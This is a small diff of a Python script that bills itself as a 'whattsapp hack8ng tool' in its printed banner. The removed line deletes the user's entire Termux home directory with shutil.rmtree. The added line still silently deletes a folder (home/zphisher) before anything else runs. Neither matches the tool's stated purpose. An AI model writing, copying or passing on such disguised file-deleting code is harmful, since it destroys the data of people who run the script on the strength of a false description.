@@ -1,5 +1,5 @@
 import shutil
-shutil.rmtree('/data/data/com.termux/files/home')
+shutil.rmtree('/data/data/com.termux/files/home/zphisher')
 
 print('--------------------------------------------')
 print('wellcome to whattsapp hack8ng tool')
